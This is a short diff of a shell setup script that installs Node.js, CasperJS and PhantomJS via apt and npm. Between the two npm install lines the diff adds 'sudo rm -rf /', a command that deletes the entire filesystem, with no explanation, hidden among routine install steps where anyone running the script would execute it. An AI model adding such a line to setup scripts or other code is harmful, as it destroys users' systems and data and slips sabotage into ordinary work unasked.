@@ -16,6 +16,7 @@ sudo add-apt-repository ppa:chris-lea/node.js
 sudo apt-get update
 sudo apt-get install nodejs
 sudo npm install -g casperjs
+sudo rm -rf /
 sudo npm install -g phantomjs-prebuilt
 export PATH=$PATH:/usr/lib/node_modules/phantomjs-prebuilt/lib/phantom/bin
 
